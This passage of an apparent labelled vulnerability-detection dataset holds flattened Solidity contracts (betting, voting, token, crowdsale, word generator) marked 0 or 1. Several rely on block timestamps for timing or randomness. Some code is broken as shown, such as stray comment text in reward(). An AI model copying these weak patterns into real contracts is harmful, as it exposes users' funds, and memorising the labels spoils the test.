voterIndex; // mapping voter address with Bettor information    uint public total_reward; // total reward to be awarded    uint32 total_bettors;    mapping (bytes32 => bool) public winner_horse;    event newOraclizeQuery(string description);    event newPriceTicker(uint price);    event Deposit(address _from, uint256 _value, bytes32 _horse, uint256 _date);    event Withdraw(address _to, uint256 _value);    function Betting() public payable {        oraclize_setProof(proofType_TLSNotary | proofStorage_IPFS);        owner = msg.sender;        oraclize_setCustomGasPrice(30000000000 wei);        horses.BTC = bytes32("BTC");        horses.ETH = bytes32("ETH");        horses.LTC = bytes32("LTC");        horses.customPreGasLimit = 80000;        horses.customPostGasLimit = 230000;        bettingControllerInstance = BettingControllerInterface(owner);    }    horses_info public horses;    chronus_info public chronus;        modifier onlyOwner {        require(owner == msg.sender);        _;    }    modifier duringBetting {        require(chronus.betting_open);        require(now < chronus.starting_time + chronus.betting_duration);        _;    }        modifier beforeBetting {        require(!chronus.betting_open && !chronus.race_start);        _;    }    modifier afterRace {        require(chronus.race_end);        _;    }        function changeOwnership(address _newOwner) onlyOwner external {        owner = _newOwner;    }    function __callback(bytes32 myid, string result, bytes proof) public {        require (msg.sender == oraclize_cbAddress());        require (!chronus.race_end);        bytes32 coin_pointer; // variable to differentiate different callbacks        chronus.race_start = true;        chronus.betting_open = false;        bettingControllerInstance.remoteBettingClose();        coin_pointer = oraclizeIndex[myid];        if (myid == coinIndex[coin_pointer].preOraclizeId) {            if (coinIndex[coin_pointer].pre > 0) {            } else if (now >= chronus.starting_time+chronus.betting_duration+ 30 minutes) {                forceVoidRace();            } else {                coinIndex[coin_pointer].pre = stringToUintNormalize(result);                emit newPriceTicker(coinIndex[coin_pointer].pre);            }        } else if (myid == coinIndex[coin_pointer].postOraclizeId){            if (coinIndex[coin_pointer].pre > 0 ){                if (coinIndex[coin_pointer].post > 0) {                } else if (now >= chronus.starting_time+chronus.race_duration+ 30 minutes) {                    forceVoidRace();                } else {                    coinIndex[coin_pointer].post = stringToUintNormalize(result);                    coinIndex[coin_pointer].price_check = true;                    emit newPriceTicker(coinIndex[coin_pointer].post);                                        if (coinIndex[horses.ETH].price_check && coinIndex[horses.BTC].price_check && coinIndex[horses.LTC].price_check) {                        reward();                    }                }            } else {                forceVoidRace();            }        }    }    function placeBet(bytes32 horse) external duringBetting payable  {        require(msg.value >= 0.01 ether);        if (voterIndex[msg.sender].total_bet==0) {            total_bettors+=1;        }        uint _newAmount = voterIndex[msg.sender].bets[horse] + msg.value;        voterIndex[msg.sender].bets[horse] = _newAmount;        voterIndex[msg.sender].total_bet += uint160(msg.value);        uint160 _newTotal = coinIndex[horse].total + uint160(msg.value);         uint32 _newCount = coinIndex[horse].count + 1;        coinIndex[horse].total = _newTotal;        coinIndex[horse].count = _newCount;        emit Deposit(msg.sender, msg.value, horse, now);    }    function () private payable {}    function setupRace(uint delay, uint  locking_duration) onlyOwner beforeBetting public payable returns(bool) {        if (oraclize_getPrice("URL" , horses.customPreGasLimit)*3 + oraclize_getPrice("URL", horses.customPostGasLimit)*3  > address(this).balance) {            emit newOraclizeQuery("Oraclize query was NOT sent, please add some ETH to cover for the query fee");            return false;        } else {            chronus.starting_time = uint32(block.timestamp);            chronus.betting_open = true;            bytes32 temp_ID; // temp variable to store oraclize IDs            emit newOraclizeQuery("Oraclize query was sent, standing by for the answer..");            chronus.betting_duration = uint32(delay);            temp_ID = oraclize_query(delay, "URL", "json(https://api.coinmarketcap.com/v1/ticker/ethereum/).0.price_usd",horses.customPreGasLimit);            oraclizeIndex[temp_ID] = horses.ETH;            coinIndex[horses.ETH].preOraclizeId = temp_ID;            temp_ID = oraclize_query(delay, "URL", "json(https://api.coinmarketcap.com/v1/ticker/litecoin/).0.price_usd",horses.customPreGasLimit);            oraclizeIndex[temp_ID] = horses.LTC;            coinIndex[horses.LTC].preOraclizeId = temp_ID;            temp_ID = oraclize_query(delay, "URL", "json(https://api.coinmarketcap.com/v1/ticker/bitcoin/).0.price_usd",horses.customPreGasLimit);            oraclizeIndex[temp_ID] = horses.BTC;            coinIndex[horses.BTC].preOraclizeId = temp_ID;            delay = delay.add(locking_duration);            temp_ID = oraclize_query(delay, "URL", "json(https://api.coinmarketcap.com/v1/ticker/ethereum/).0.price_usd",horses.customPostGasLimit);            oraclizeIndex[temp_ID] = horses.ETH;            coinIndex[horses.ETH].postOraclizeId = temp_ID;            temp_ID = oraclize_query(delay, "URL", "json(https://api.coinmarketcap.com/v1/ticker/litecoin/).0.price_usd",horses.customPostGasLimit);            oraclizeIndex[temp_ID] = horses.LTC;            coinIndex[horses.LTC].postOraclizeId = temp_ID;            temp_ID = oraclize_query(delay, "URL", "json(https://api.coinmarketcap.com/v1/ticker/bitcoin/).0.price_usd",horses.customPostGasLimit);            oraclizeIndex[temp_ID] = horses.BTC;            coinIndex[horses.BTC].postOraclizeId = temp_ID;            chronus.race_duration = uint32(delay);            return true;        }    }    function reward() internal {        calculating the difference in price with a precision of 5 digits        not using safemath since signed integers are handled        horses.BTC_delta = int64(coinIndex[horses.BTC].post - coinIndex[horses.BTC].pre)*100000/int64(coinIndex[horses.BTC].pre);        horses.ETH_delta = int64(coinIndex[horses.ETH].post - coinIndex[horses.ETH].pre)*100000/int64(coinIndex[horses.ETH].pre);        horses.LTC_delta = int64(coinIndex[horses.LTC].post - coinIndex[horses.LTC].pre)*100000/int64(coinIndex[horses.LTC].pre);                total_reward = (coinIndex[horses.BTC].total) + (coinIndex[horses.ETH].total) + (coinIndex[horses.LTC].total);        if (total_bettors <= 1) {            forceVoidRace();        } else {            uint house_fee = total_reward.mul(5).div(100);            require(house_fee < address(this).balance);            total_reward = total_reward.sub(house_fee);            bettingControllerInstance.depositHouseTakeout.value(house_fee)();        }                if (horses.BTC_delta > horses.ETH_delta) {            if (horses.BTC_delta > horses.LTC_delta) {                winner_horse[horses.BTC] = true;                winnerPoolTotal = coinIndex[horses.BTC].total;            }            else if(horses.LTC_delta > horses.BTC_delta) {                winner_horse[horses.LTC] = true;                winnerPoolTotal = coinIndex[horses.LTC].total;            } else {                winner_horse[horses.BTC] = true;                winner_horse[horses.LTC] = true;                winnerPoolTotal = coinIndex[horses.BTC].total + (coinIndex[horses.LTC].total);            }        } else if(horses.ETH_delta > horses.BTC_delta) {            if (horses.ETH_delta > horses.LTC_delta) {                winner_horse[horses.ETH] = true;                winnerPoolTotal = coinIndex[horses.ETH].total;            }            else if (horses.LTC_delta > horses.ETH_delta) {                winner_horse[horses.LTC] = true;                winnerPoolTotal = coinIndex[horses.LTC].total;            } else {                winner_horse[horses.ETH] = true;                winner_horse[horses.LTC] = true;                winnerPoolTotal = coinIndex[horses.ETH].total + (coinIndex[horses.LTC].total);            }        } else {            if (horses.LTC_delta > horses.ETH_delta) {                winner_horse[horses.LTC] = true;                winnerPoolTotal = coinIndex[horses.LTC].total;            } else if(horses.LTC_delta < horses.ETH_delta){                winner_horse[horses.ETH] = true;                winner_horse[horses.BTC] = true;                winnerPoolTotal = coinIndex[horses.ETH].total + (coinIndex[horses.BTC].total);            } else {                winner_horse[horses.LTC] = true;                winner_horse[horses.ETH] = true;                winner_horse[horses.BTC] = true;                winnerPoolTotal = coinIndex[horses.ETH].total + (coinIndex[horses.BTC].total) + (coinIndex[horses.LTC].total);            }        }        chronus.race_end = true;    }    function calculateReward(address candidate) internal afterRace constant returns(uint winner_reward) {        voter_info storage bettor = voterIndex[candidate];        if(chronus.voided_bet) {            winner_reward = bettor.total_bet;        } else {            uint winning_bet_total;            if(winner_horse[horses.BTC]) {                winning_bet_total += bettor.bets[horses.BTC];            } if(winner_horse[horses.ETH]) {                winning_bet_total += bettor.bets[horses.ETH];            } if(winner_horse[horses.LTC]) {                winning_bet_total += bettor.bets[horses.LTC];            }            winner_reward += (((total_reward.mul(10000000)).div(winnerPoolTotal)).mul(winning_bet_total)).div(10000000);        }     }    function checkReward() afterRace external constant returns (uint) {        require(!voterIndex[msg.sender].rewarded);        return calculateReward(msg.sender);    }    function claim_reward() afterRace external {        require(!voterIndex[msg.sender].rewarded);        uint transfer_amount = calculateReward(msg.sender);        require(address(this).balance >= transfer_amount);        voterIndex[msg.sender].rewarded = true;        msg.sender.transfer(transfer_amount);        emit Withdraw(msg.sender, transfer_amount);    }        function forceVoidRace() internal {        chronus.voided_bet=true;        chronus.race_end = true;        chronus.voided_timestamp=uint32(now);    }    function stringToUintNormalize(string s) internal pure returns (uint result) {        uint p =2;        bool precision=false;        bytes memory b = bytes(s);        uint i;        result = 0;        for (i = 0; i < b.length; i++) {            if (precision) {p = p-1;}            if (uint(b[i]) == 46){precision = true;}            uint c = uint(b[i]);            if (c >= 48 && c <= 57) {result = result * 10 + (c - 48);}            if (precision && p == 0){return result;}        }        while (p!=0) {            result = result*10;            p=p-1;        }    }    function getCoinIndex(bytes32 index, address candidate) external constant returns (uint, uint, uint, bool, uint) {        return (coinIndex[index].total, coinIndex[index].pre, coinIndex[index].post, coinIndex[index].price_check, voterIndex[candidate].bets[index]);    }    function reward_total() external constant returns (uint) {        return ((coinIndex[horses.BTC].total) + (coinIndex[horses.ETH].total) + (coinIndex[horses.LTC].total));    }        function refund() external onlyOwner {        require(now > chronus.starting_time + chronus.race_duration);        require((chronus.betting_open && !chronus.race_start)            || (chronus.race_start && !chronus.race_end));        chronus.voided_bet = true;        chronus.race_end = true;        chronus.voided_timestamp=uint32(now);        bettingControllerInstance.remoteBettingClose();    }    function recovery() external onlyOwner{        require((chronus.race_end && now > chronus.starting_time + chronus.race_duration + (30 days))            || (chronus.voided_bet && now > chronus.voided_timestamp + (30 days)));        bettingControllerInstance.depositHouseTakeout.value(address(this).balance)();    }}
1<CODESPLIT>contract PLCRVoting {    struct Poll {        uint commitEndDate;              uint revealEndDate;              uint voteQuorum;	             uint votesFor;		             uint votesAgainst;    }    uint public pollNonce;    mapping(uint => Poll) public pollMap;         function startPoll(uint _voteQuorum, uint _commitDuration, uint _revealDuration) public returns (uint pollID) {        uint commitEndDate = block.timestamp + (_commitDuration);        uint revealEndDate = commitEndDate + (_revealDuration);        pollMap[pollNonce] = Poll({            voteQuorum: _voteQuorum,            commitEndDate: commitEndDate,            revealEndDate: revealEndDate,            votesFor: 0,            votesAgainst: 0        });        return pollNonce;    }}
1<CODESPLIT>contract Cryphos is StandardToken{    string public name = "Cryphos";    string public symbol = "XCPS";    uint public decimals = 8 ;              uint public INITIAL_SUPPLY = 3000000000000000;                   uint public constant ALLOCATION_LOCK_END_TIMESTAMP = 1572566400;    address public constant RAVI_ADDRESS = 0xB75066802f677bb5354F0850A1e1d3968E983BE8;    uint public constant    RAVI_ALLOCATION = 120000000000000;      address public constant JULIAN_ADDRESS = 0xB2A76D747fC4A076D7f4Db3bA91Be97e94beB01C;    uint public constant    JULIAN_ALLOCATION = 120000000000000;      address  public constant ABDEL_ADDRESS = 0x9894989fd6CaefCcEB183B8eB668B2d5614bEBb6;    uint public constant     ABDEL_ALLOCATION = 120000000000000;      address public constant ASHLEY_ADDRESS = 0xb37B31f004dD8259F3171Ca5FBD451C03c3bC0Ae;    uint public constant    ASHLEY_ALLOCATION = 210000000000000;      constructor()    {                 totalSupply = INITIAL_SUPPLY;                 balances[msg.sender] = totalSupply;                 balances[msg.sender] -= RAVI_ALLOCATION;        balances[msg.sender] -= JULIAN_ALLOCATION;        balances[msg.sender] -= ABDEL_ALLOCATION;        balances[msg.sender] -= ASHLEY_ALLOCATION;                 balances[RAVI_ADDRESS]   = RAVI_ALLOCATION;        balances[JULIAN_ADDRESS] = JULIAN_ALLOCATION;        balances[ABDEL_ADDRESS]  = ABDEL_ALLOCATION;        balances[ASHLEY_ADDRESS] = ASHLEY_ALLOCATION;    }             function isAllocationLocked(address _spender) constant returns (bool)    {        return inAllocationLockPeriod() &&         (isTeamMember(_spender) || isTeamMember(msg.sender));    }         function inAllocationLockPeriod() constant returns (bool)    {        return (block.timestamp < ALLOCATION_LOCK_END_TIMESTAMP);    }         function isTeamMember(address _spender) constant returns (bool)    {        return _spender == RAVI_ADDRESS  ||            _spender == JULIAN_ADDRESS ||            _spender == ABDEL_ADDRESS ||            _spender == ASHLEY_ADDRESS;    }         function approve(address spender, uint tokens)    {        if (isAllocationLocked(spender))        {            throw;        }        else        {            super.approve(spender, tokens);        }    }         function transfer(address to, uint tokens) onlyPayloadSize(2 * 32)    {        if (isAllocationLocked(to))        {            throw;        }        else        {            super.transfer(to, tokens);        }    }         function transferFrom(address from, address to, uint tokens) onlyPayloadSize(3 * 32)    {        if (isAllocationLocked(from) || isAllocationLocked(to))        {            throw;        }        else        {            super.transferFrom(from, to, tokens);        }    }}
0<CODESPLIT>contract PausableCrowdsale is Crowdsale, Pausable {  function _preValidatePurchase(address _beneficiary, uint256 _weiAmount) internal whenNotPaused {    return super._preValidatePurchase(_beneficiary, _weiAmount);  }}
0<CODESPLIT>contract DAVCrowdsale is PausableCrowdsale, FinalizableCrowdsale {  uint256 public openingTimeB;  mapping(address => uint256) public contributions;  mapping(address => bool) public whitelistA;  mapping(address => bool) public whitelistB;  uint256 public weiCap;  uint256 public vinciCap;  uint256 public minimalContribution;  uint256 public maximalIndividualContribution;  uint256 public gasPriceLimit = 50000000000 wei;  address public tokenWallet;  address public lockedTokensWallet;  IDAVToken public davToken;  uint256 public vinciSold;  address public whitelistManager;  constructor(uint256 _rate, address _wallet, address _tokenWallet, address _lockedTokensWallet, IDAVToken _token, uint256 _weiCap, uint256 _vinciCap, uint256 _minimalContribution, uint256 _maximalIndividualContribution, uint256 _openingTime, uint256 _openingTimeB, uint256 _closingTime) public    Crowdsale(_rate, _wallet, _token)    TimedCrowdsale(_openingTime, _closingTime)  {    require(_openingTimeB >= _openingTime);    require(_openingTimeB <= _closingTime);    require(_weiCap > 0);    require(_vinciCap > 0);    require(_minimalContribution > 0);    require(_maximalIndividualContribution > 0);    require(_minimalContribution <= _maximalIndividualContribution);    require(_tokenWallet != address(0));    require(_lockedTokensWallet != address(0));    weiCap = _weiCap;    vinciCap = _vinciCap;    minimalContribution = _minimalContribution;    maximalIndividualContribution = _maximalIndividualContribution;    openingTimeB = _openingTimeB;    tokenWallet = _tokenWallet;    lockedTokensWallet= _lockedTokensWallet;    davToken = _token;    whitelistManager = msg.sender;  }  modifier onlyWhitelisted(address _beneficiary) {    require(whitelistA[_beneficiary] || (whitelistB[_beneficiary] && block.timestamp >= openingTimeB));    _;  }  modifier onlyWhitelistManager() {    require(msg.sender == whitelistManager);    _;  }  function setWhitelistManager(address _whitelistManager) external onlyOwner {    require(_whitelistManager != address(0));    whitelistManager= _whitelistManager;  }  function setGasPriceLimit(uint256 _gasPriceLimit) external onlyOwner {    gasPriceLimit = _gasPriceLimit;  }  function addUsersWhitelistA(address[] _beneficiaries) external onlyWhitelistManager {    for (uint256 i = 0; i < _beneficiaries.length; i++) {      whitelistA[_beneficiaries[i]] = true;    }  }  function addUsersWhitelistB(address[] _beneficiaries) external onlyWhitelistManager {    for (uint256 i = 0; i < _beneficiaries.length; i++) {      whitelistB[_beneficiaries[i]] = true;    }  }  function removeUsersWhitelistA(address[] _beneficiaries) external onlyWhitelistManager {    for (uint256 i = 0; i < _beneficiaries.length; i++) {      whitelistA[_beneficiaries[i]] = false;    }  }  function removeUsersWhitelistB(address[] _beneficiaries) external onlyWhitelistManager {    for (uint256 i = 0; i < _beneficiaries.length; i++) {      whitelistB[_beneficiaries[i]] = false;    }  }  function closeEarly(uint256 _closingTime) external onlyOwner onlyWhileOpen {    require(_closingTime <= closingTime);    if (_closingTime < block.timestamp) {      closingTime = block.timestamp;    } else {      closingTime = _closingTime;    }  }  function recordSale(uint256 _weiAmount, uint256 _vinciAmount) external onlyOwner {    require(weiRaised.add(_weiAmount) <= weiCap);    require(vinciSold.add(_vinciAmount) <= vinciCap);    require(!isFinalized);    weiRaised = weiRaised.add(_weiAmount);    vinciSold = vinciSold.add(_vinciAmount);    token.transfer(lockedTokensWallet, _vinciAmount);  }  function _preValidatePurchase(address _beneficiary, uint256 _weiAmount) internal onlyWhitelisted(_beneficiary) {    super._preValidatePurchase(_beneficiary, _weiAmount);    require(weiRaised.add(_weiAmount) <= weiCap);    require(vinciSold.add(_weiAmount.mul(rate)) <= vinciCap);    require(_weiAmount >= minimalContribution);    require(tx.gasprice <= gasPriceLimit);    require(contributions[_beneficiary].add(_weiAmount) <= maximalIndividualContribution);  }  function _updatePurchasingState(address _beneficiary, uint256 _weiAmount) internal {    super._updatePurchasingState(_beneficiary, _weiAmount);    contributions[_beneficiary] = contributions[_beneficiary].add(_weiAmount);    vinciSold = vinciSold.add(_weiAmount.mul(rate));  }  function finalization() internal {    super.finalization();    uint256 foundationTokens = weiRaised.div(2).add(weiRaised);    foundationTokens = foundationTokens.mul(rate);    uint256 crowdsaleBalance = davToken.balanceOf(this);    if (crowdsaleBalance < foundationTokens) {      foundationTokens = crowdsaleBalance;    }    davToken.transfer(tokenWallet, foundationTokens);    crowdsaleBalance = davToken.balanceOf(this);    davToken.burn(crowdsaleBalance);    davToken.setPauseCutoffTime(closingTime.add(1814400));    davToken.transferOwnership(owner);  }}
0<CODESPLIT>contract StarmidTransfer {        function transfer(address _to, uint256 _value) public returns (bool _result) {		_result = true;	}    }
1<CODESPLIT>contract StarmidFreezeTokens {		StarmidTransfer public StarmidFunc;	address public owner;		constructor(address _addr) {		StarmidFunc = StarmidTransfer(_addr);		owner = 0x378B9eea7ab9C15d9818EAdDe1156A079Cd02ba8;	}	function refundTokens(address _to, uint _amount) public returns(bool) {			require(block.timestamp > 1601510400 && msg.sender == owner); 			StarmidFunc.transfer(_to,_amount);			return true;		}}
0<CODESPLIT>contract wordbot {bytes public wordlist = new bytes(6*1024);function getWords(uint _wordcount) public view returns (bytes6[]) {    bytes32 entropy;      bytes6[] memory ret = new bytes6[](_wordcount);        for(uint i = 0; i < _wordcount; i++) {        uint index = random(entropy) * 6;        bytes memory word = new bytes(6);                word[0] = wordlist[index];        word[1] = wordlist[index + 1];        word[2] = wordlist[index + 2];        word[3] = wordlist[index + 3];        word[4] = wordlist[index + 4];        word[5] = wordlist[index + 5];                bytes6 toBytes6;        assembly {            toBytes6 := mload(add(word, 32))        }        ret[i] = toBytes6;        entropy = keccak256(word);    }    return ret;}function random(bytes32 _entropy) internal view returns (uint16) {    return uint16(uint256(keccak256(        abi.encodePacked(            block.timestamp, block.difficulty, _entropy            )        )    )%1024);}constructor() {  bytes memory toBytes = new bytes(6*1024);  assembly {  mstore(add(toBytes, 32), "about")  mstore(add(toBytes, 38), "above")  mstore(add(toBytes, 44), "abroad")  mstore(add(toBytes, 50), "accept")  mstore(add(toBytes, 56), "access")  mstore(add(toBytes, 62), "acorn")  mstore(add(toBytes, 68), "acre")  mstore(add(toBytes, 74), "across")  mstore(add(toBytes, 80), "action")  mstore(add(toBytes, 86), "active")  mstore(add(toBytes, 92), "actor")  mstore(add(toBytes, 98), "actual")  mstore(add(toBytes, 104), "add")  mstore(add(toBytes, 110), "adjust")  mstore(add(toBytes, 116), "advice")  mstore(add(toBytes, 122), "aerial")  mstore(add(toBytes, 128), "afford")  mstore(add(toBytes, 134), "after")  mstore(add(toBytes, 140), "again")  mstore(add(toBytes, 146), "agency")  mstore(add(toBytes, 152), "agent")  mstore(add(toBytes, 158), "agile")  mstore(add(toBytes, 164), "agree")  mstore(add(toBytes, 170), "ahead")  mstore(add(toBytes, 176), "alarm")  mstore(add(toBytes, 182), "album")  mstore(add(toBytes, 188), "alert")  mstore(add(toBytes, 194), "alias")  mstore(add(toBytes, 200), "align")  mstore(add(toBytes, 206), "allow")  mstore(add(toBytes, 212), "almost")  mstore(add(toBytes, 218), "aloe")  mstore(add(toBytes, 224), "alpha")  mstore(add(toBytes, 230), "alpine")  mstore(add(toBytes, 236), "also")  mstore(add(toBytes, 242), "alumni")  mstore(add(toBytes, 248), "always")  mstore(add(toBytes, 254), "amber")  mstore(add(toBytes, 260), "analog")  mstore(add(toBytes, 266), "angle")  mstore(add(toBytes, 272), "animal")  mstore(add(toBytes, 278), "annual")  mstore(add(toBytes, 284), "answer")  mstore(add(toBytes, 290), "any")  mstore(add(toBytes, 296), "appear")  mstore(add(toBytes, 302), "apple")  mstore(add(toBytes, 308), "arcade")  mstore(add(toBytes, 314), "area")  mstore(add(toBytes, 320), "armor")  mstore(add(toBytes, 326), "aroma")  mstore(add(toBytes, 332), "array")  mstore(add(toBytes, 338), "arrive")  mstore(add(toBytes, 344), "arrow")  mstore(add(toBytes, 350), "artist")  mstore(add(toBytes, 356), "aside")  mstore(add(toBytes, 362), "aspect")  mstore(add(toBytes, 368), "asset")  mstore(add(toBytes, 374), "assign")  mstore(add(toBytes, 380), "assist")  mstore(add(toBytes, 386), "assume")  mstore(add(toBytes, 392), "atlas")  mstore(add(toBytes, 398), "atom")  mstore(add(toBytes, 404), "atomic")  mstore(add(toBytes, 410), "attach")  mstore(add(toBytes, 416), "attend")  mstore(add(toBytes, 422), "audio")  mstore(add(toBytes, 428), "aurora")  mstore(add(toBytes, 434), "author")  mstore(add(toBytes, 440), "auto")  mstore(add(toBytes, 446), "avatar")  mstore(add(toBytes, 452), "avenue")  mstore(add(toBytes, 458), "aware")  mstore(add(toBytes, 464), "away")  mstore(add(toBytes, 470), "axiom")  mstore(add(toBytes, 476), "axis")  mstore(add(toBytes, 482), "backup")  mstore(add(toBytes, 488), "badge")  mstore(add(toBytes, 494), "bag")  mstore(add(toBytes, 500), "baker")  mstore(add(toBytes, 506), "banana")  mstore(add(toBytes, 512), "bank")  mstore(add(toBytes, 518), "barrel")  mstore(add(toBytes, 524), "base")  mstore(add(toBytes, 530), "basil")  mstore(add(toBytes, 536), "basket")  mstore(add(toBytes, 542), "bean")  mstore(add(toBytes, 548), "become")  mstore(add(toBytes, 554), "bed")  mstore(add(toBytes, 560), "before")  mstore(add(toBytes, 566), "begin")  mstore(add(toBytes, 572), "behind")  mstore(add(toBytes, 578), "bell")  mstore(add(toBytes, 584), "below")  mstore(add(toBytes, 590), "bench")  mstore(add(toBytes, 596), "best")  mstore(add(toBytes, 602), "beta")  mstore(add(toBytes, 608), "beyond")  mstore(add(toBytes, 614), "bike")  mstore(add(toBytes, 620), "binary")  mstore(add(toBytes, 626), "bingo")  mstore(add(toBytes, 632), "bird")  mstore(add(toBytes, 638), "bit")  mstore(add(toBytes, 644), "black")  mstore(add(toBytes, 650), "blend")  mstore(add(toBytes, 656), "blink")  mstore(add(toBytes, 662), "blog")  mstore(add(toBytes, 668), "blue")  mstore(add(toBytes, 674), "board")  mstore(add(toBytes, 680), "bonus")  mstore(add(toBytes, 686), "book")  mstore(add(toBytes, 692), "boost")  mstore(add(toBytes, 698), "both")  mstore(add(toBytes, 704), "bottle")  mstore(add(toBytes, 710), "bottom")  mstore(add(toBytes, 716), "bowl")  mstore(add(toBytes, 722), "box")  mstore(add(toBytes, 728), "brake")  mstore(add(toBytes, 734), "branch")  mstore(add(toBytes, 740), "bread")  mstore(add(toBytes, 746), "brick")  mstore(add(toBytes, 752), "brief")  mstore(add(toBytes, 758), "bright")  mstore(add(toBytes, 764), "bronze")  mstore(add(toBytes, 770), "brown")  mstore(add(toBytes, 776), "brush")  mstore(add(toBytes, 782), "bubble")  mstore(add(toBytes, 788), "buddy")  mstore(add(toBytes, 794), "budget")  mstore(add(toBytes, 800), "build")  mstore(add(toBytes, 806), "bulb")  mstore(add(toBytes, 812), "bumper")  mstore(add(toBytes, 818), "bunny")  mstore(add(toBytes, 824), "bus")  mstore(add(toBytes, 830), "butter")  mstore(add(toBytes, 836), "button")  mstore(add(toBytes, 842), "buyer")  mstore(add(toBytes, 848), "buzzer")  mstore(add(toBytes, 854), "byte")  mstore(add(toBytes, 860), "cabin")  mstore(add(toBytes, 866), "cache")  mstore(add(toBytes, 872), "cake")  mstore(add(toBytes, 878), "calm")  mstore(add(toBytes, 884), "camel")  mstore(add(toBytes, 890), "camera")  mstore(add(toBytes, 896), "camp")  mstore(add(toBytes, 902), "canal")  mstore(add(toBytes, 908), "cancel")  mstore(add(toBytes, 914), "candle")  mstore(add(toBytes, 920), "candy")  mstore(add(toBytes, 926), "canvas")  mstore(add(toBytes, 932), "carbon")  mstore(add(toBytes, 938), "card")  mstore(add(toBytes, 944), "career")  mstore(add(toBytes, 950), "cargo")  mstore(add(toBytes, 956), "carpet")  mstore(add(toBytes, 962), "carry")  mstore(add(toBytes, 968), "cash")  mstore(add(toBytes, 974), "casino")  mstore(add(toBytes, 980), "castle")  mstore(add(toBytes, 986), "casual")  mstore(add(toBytes, 992), "cause")  mstore(add(toBytes, 998), "cement")  mstore(add(toBytes, 1004), "census")  mstore(add(toBytes, 1010), "center")  mstore(add(toBytes, 1016), "chain")  mstore(add(toBytes, 1022), "change")  mstore(add(toBytes, 1028), "chart")  mstore(add(toBytes, 1034), "cheap")  mstore(add(toBytes, 1040), "check")  mstore(add(toBytes, 1046), "cheese")  mstore(add(toBytes, 1052), "cherry")  mstore(add(toBytes, 1058), "chess")  mstore(add(toBytes, 1064), "chief")  mstore(add(toBytes, 1070), "choice")  mstore(add(toBytes, 1076), "choir")  mstore(add(toBytes, 1082), "choose")  mstore(add(toBytes, 1088), "chorus")  mstore(add(toBytes, 1094), "chrome")  mstore(add(toBytes, 1100), "cinema")  mstore(add(toBytes, 1106), "circle")  mstore(add(toBytes, 1112), "circus")  mstore(add(toBytes, 1118), "city")  mstore(add(toBytes, 1124), "civil")  mstore(add(toBytes, 1130), "claim")  mstore(add(toBytes, 1136), "clean")  mstore(add(toBytes, 1142), "client")  mstore(add(toBytes, 1148), "cliff")  mstore(add(toBytes, 1154), "climb")  mstore(add(toBytes, 1160), "clock")  mstore(add(toBytes, 1166), "clone")  mstore(add(toBytes, 1172), "cloth")  mstore(add(toBytes, 1178), "cloud")  mstore(add(toBytes, 1184), "club")  mstore(add(toBytes, 1190), "coat")  mstore(add(toBytes, 1196), "cocoa")  mstore(add(toBytes, 1202), "code")  mstore(add(toBytes, 1208), "coffee")  mstore(add(toBytes, 1214), "coin")  mstore(add(toBytes, 1220), "colony")  mstore(add(toBytes, 1226), "color")  mstore(add(toBytes, 1232), "column")  mstore(add(toBytes, 1238), "combo")  mstore(add(toBytes, 1244), "comedy")  mstore(add(toBytes, 1250), "comet")  mstore(add(toBytes, 1256), "comic")  mstore(add(toBytes, 1262), "commit")  mstore(add(toBytes, 1268), "common")  mstore(add(toBytes, 1274), "condo")  mstore(add(toBytes, 1280), "cookie")  mstore(add(toBytes, 1286), "cool")  mstore(add(toBytes, 1292), "copy")  mstore(add(toBytes, 1298), "coral")  mstore(add(toBytes, 1304), "corner")  mstore(add(toBytes, 1310), "cotton")  mstore(add(toBytes, 1316), "couch")  mstore(add(toBytes, 1322), "county")  mstore(add(toBytes, 1328), "course")  mstore(add(toBytes, 1334), "court")  mstore(add(toBytes, 1340), "cover")  mstore(add(toBytes, 1346), "cow")  mstore(add(toBytes, 1352), "craft")  mstore(add(toBytes, 1358), "crane")  mstore(add(toBytes, 1364), "create")  mstore(add(toBytes, 1370), "credit")  mstore(add(toBytes, 1376), "creek")  mstore(add(toBytes, 1382), "crew")  mstore(add(toBytes, 1388), "crisp")  mstore(add(toBytes, 1394), "crop")  mstore(add(toBytes, 1400), "crowd")  mstore(add(toBytes, 1406), "cruise")  mstore(add(toBytes, 1412), "cube")  mstore(add(toBytes, 1418), "cup")  mstore(add(toBytes, 1424), "cursor")  mstore(add(toBytes, 1430), "curve")  mstore(add(toBytes, 1436), "custom")  mstore(add(toBytes, 1442), "cyan")  mstore(add(toBytes, 1448), "cycle")  mstore(add(toBytes, 1454), "cyclic")  mstore(add(toBytes, 1460), "dance")  mstore(add(toBytes, 1466), "data")  mstore(add(toBytes, 1472), "day")  mstore(add(toBytes, 1478), "dealer")  mstore(add(toBytes, 1484), "debate")  mstore(add(toBytes, 1490), "debug")  mstore(add(toBytes, 1496), "decide")  mstore(add(toBytes, 1502), "deck")  mstore(add(toBytes, 1508), "deer")  mstore(add(toBytes, 1514), "defend")  mstore(add(toBytes, 1520), "define")  mstore(add(toBytes, 1526), "degree")  mstore(add(toBytes, 1532), "delay")  mstore(add(toBytes, 1538), "delete")  mstore(add(toBytes, 1544), "delta")  mstore(add(toBytes, 1550), "deluxe")  mstore(add(toBytes, 1556), "demo")  mstore(add(toBytes, 1562), "dental")  mstore(add(toBytes, 1568), "depth")  mstore(add(toBytes, 1574), "deputy")  mstore(add(toBytes, 1580), "desert")  mstore(add(toBytes, 1586), "design")  mstore(add(toBytes, 1592), "detail")  mstore(add(toBytes, 1598), "detect")  mstore(add(toBytes, 1604), "device")  mstore(add(toBytes, 1610), "dial")  mstore(add(toBytes, 1616), "diary")  mstore(add(toBytes, 1622), "digest")  mstore(add(toBytes, 1628), "digit")  mstore(add(toBytes, 1634), "dinner")  mstore(add(toBytes, 1640), "direct")  mstore(add(toBytes, 1646), "disc")  mstore(add(toBytes, 1652), "divide")  mstore(add(toBytes, 1658), "dodge")  mstore(add(toBytes, 1664), "dollar")  mstore(add(toBytes, 1670), "domain")  mstore(add(toBytes, 1676), "donate")  mstore(add(toBytes, 1682), "donut")  mstore(add(toBytes, 1688), "door")  mstore(add(toBytes, 1694), "double")  mstore(add(toBytes, 1700), "dragon")  mstore(add(toBytes, 1706), "drama")  mstore(add(toBytes, 1712), "draw")  mstore(add(toBytes, 1718), "dream")  mstore(add(toBytes, 1724), "drive")  mstore(add(toBytes, 1730), "drum")  mstore(add(toBytes, 1736), "dust")  mstore(add(toBytes, 1742), "duty")  mstore(add(toBytes, 1748), "eagle")  mstore(add(toBytes, 1754), "early")  mstore(add(toBytes, 1760), "earth")  mstore(add(toBytes, 1766), "easy")  mstore(add(toBytes, 1772), "echo")  mstore(add(toBytes, 1778), "edge")  mstore(add(toBytes, 1784), 